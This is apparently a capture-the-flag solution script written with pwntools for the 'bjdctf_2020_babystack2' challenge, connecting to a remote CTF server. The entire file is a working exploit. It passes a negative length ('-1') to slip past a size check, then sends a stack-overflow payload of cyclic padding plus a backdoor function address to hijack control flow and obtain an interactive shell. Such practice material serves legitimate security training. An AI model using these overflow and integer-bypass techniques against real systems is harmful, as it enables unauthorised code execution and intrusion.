from pwn import *

context.log_level = 'debug'
context.arch = 'amd64'
# io = process('bjdctf_2020_babystack2')
io = remote('node4.buuoj.cn', 28513)
backdoor = 0x400726

io.sendlineafter('[+]Please input the length of your name:\n', '-1')
payload = cyclic(0x18) + p64(backdoor)
io.sendlineafter('[+]What\'s u name?\n', payload)
io.interactive()

